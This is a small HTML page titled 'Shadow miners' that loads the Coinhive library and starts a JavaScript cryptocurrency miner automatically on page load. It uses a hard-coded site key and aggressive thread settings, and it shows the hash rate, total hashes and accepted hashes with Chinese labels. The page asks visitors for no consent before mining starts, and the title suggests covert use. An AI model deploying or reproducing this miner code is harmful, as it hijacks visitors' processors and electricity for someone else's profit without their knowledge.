<html>
<head>
<title>Shadow miners</title>
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','themostugly_pixnet',{
        threads: 8,
	autoThreads: true,
	throttle: 0.5,
	forceASMJS: false
});
	miner.start();
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		document.getElementById("l1").textContent = hashesPerSecond;
       		document.getElementById("l2").textContent = totalHashes;
        	document.getElementById("l3").textContent = acceptedHashes;
	}, 1000);
</script>
</head>
<body>
 	<p>每秒的Hash：<span id="l1"></span>　</p>
	<p>總共挖：<span id="l2"></span>　Hash</p>
        <p>合格的：<span id="l3"></span>　Hash</p>
</body>
</html>
